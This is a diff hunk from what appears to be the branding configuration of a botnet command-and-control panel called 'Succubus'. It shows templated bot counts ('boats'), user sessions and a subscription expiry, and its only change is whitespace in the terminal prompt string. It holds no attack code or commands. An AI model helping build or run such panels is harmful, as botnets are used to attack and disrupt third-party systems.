@@ -24,7 +24,7 @@
     "branding":{
 
         "title":"<<$botcount>> boats | Succubus Custom Build | Serving <<$username>> | Active Sessions <<$onlineusers>> | <<$expiry>> ",
-		"prompt":"<argon>┌──</>[<argon>Succubus</>]-[~/<argon>succubus</>/<argon>cnc</>/<argon><<$username>></>]\r\n<argon>└───</>➤",
+	"prompt":"<argon>┌──</>[<argon>Succubus</>]-[~/<argon>succubus</>/<argon>cnc</>/<argon><<$username>></>]\r\n<argon>└───</>➤",
 		
         "assets":{
             "welcome":"succ",
